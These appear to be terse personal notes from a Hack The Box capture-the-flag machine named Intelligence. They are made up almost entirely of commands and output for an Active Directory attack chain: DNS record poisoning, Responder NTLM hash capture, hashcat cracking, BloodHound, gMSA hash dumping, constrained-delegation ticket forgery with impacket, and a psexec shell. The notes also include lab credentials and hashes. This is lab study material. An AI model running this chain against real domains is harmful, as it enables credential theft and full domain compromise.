# Adding DNS Record

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/krbrelayx]
â””â”€# python dnstool.py -u Intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r webfuckwindowsmachines -a add -d 10.10.14.75 10.129.24.29 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
                                                                                                                                                                                                                                             
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/krbrelayx]
â””â”€# python dnstool.py -u Intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -r webfuckwindowsmachines -a query 10.129.24.29             
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record webfuckwindowsmachines
DC=webfuckwindowsmachines,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 188)
 - Address: 10.10.14.75
```


# Running responder to get the NTLM Hash

```bash
â””â”€# responder -I tun0 -A

[HTTP] NTLMv2 Client   : 10.129.24.29
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:5668c1634a0ae3f1:E0E15F17C92F8A265E1EB8CADF7EBB3E:0101000000000000A4705D732E71D701D6262FAF7204B05D00000000020008005200550046004B0001001E00570049004E002D005A00300046005000360030004900300032004B005300040014005200550046004B002E004C004F00430041004C0003003400570049004E002D005A00300046005000360030004900300032004B0053002E005200550046004B002E004C004F00430041004C00050014005200550046004B002E004C004F00430041004C000800300030000000000000000000000000200000FBF812DCCFBD23F92E257D8E5125AFB4EA7C189FE68FA23DB9DDC122432CBB870A001000000000000000000000000000000000000900580048005400540050002F007700650062006600750063006B00770069006E0064006F00770073006D0061006300680069006E00650073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000                                                                                                                                                    
Terminated
```


# Cracking NTLM Hash

```bash
hashcat -m 5600 'Ted.Graves::intelligence:5668c1634a0ae3f1:E0E15F17C92F8A265E1EB8CADF7EBB3E:0101000000000000A4705D732E71D701D6262FAF7204B05D00000000020008005200550046004B0001001E00570049004E002D005A00300046005000360030004900300032004B005300040014005200550046004B002E004C004F00430041004C0003003400570049004E002D005A00300046005000360030004900300032004B0053002E005200550046004B002E004C004F00430041004C00050014005200550046004B002E004C004F00430041004C000800300030000000000000000000000000200000FBF812DCCFBD23F92E257D8E5125AFB4EA7C189FE68FA23DB9DDC122432CBB870A001000000000000000000000000000000000000900580048005400540050002F007700650062006600750063006B00770069006E0064006F00770073006D0061006300680069006E00650073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' ~/Desktop/rockyou.txt -O --force

TED.GRAVES::intelligence:5668c1634a0ae3f1:e0e15f17c92f8a265e1eb8cadf7ebb3e:0101000000000000a4705d732e71d701d6262faf7204b05d00000000020008005200550046004b0001001e00570049004e002d005a00300046005000360030004900300032004b005300040014005200550046004b002e004c004f00430041004c0003003400570049004e002d005a00300046005000360030004900300032004b0053002e005200550046004b002e004c004f00430041004c00050014005200550046004b002e004c004f00430041004c000800300030000000000000000000000000200000fbf812dccfbd23f92e257d8e5125afb4ea7c189fe68fa23db9ddc122432cbb870a001000000000000000000000000000000000000900580048005400540050002f007700650062006600750063006b00770069006e0064006f00770073006d0061006300680069006e00650073002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```


# Bloodhound
```bash
bloodhound-python -d Intelligence.HTB -u Ted.Graves -p Mr.Teddy -ns 10.129.24.29 -c all
``` 

![[Pasted image 20210704185453.png]]


Ted Graves can read GMSA Passwords

https://github.com/micahvandeusen/gMSADumper.git
```bash
python gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
```

# Get Service Ticket

## Finding Delegation SPN
![[Pasted image 20210705105214.png]]

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/HTB/Intelligence]
â””â”€# impacket-getST intelligence.htb/svc_int$ -spn www/dc.intelligence.htb -impersonate Administrator -dc-ip 10.129.24.29 -hashes :d64b83fe606e6d3005e20ce0ee932fe2 
```

```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/HTB/Intelligence]
â””â”€# export KRB5CCNAME=~/HTB/Intelligence/Administrator.ccache
``` 


# Root shell
```bash
â”Œâ”€â”€(rootðŸ’€kali)-[~/HTB/Intelligence]
â””â”€# impacket-psexec -dc-ip 10.129.24.29 -k -no-pass dc.intelligence.htb    
```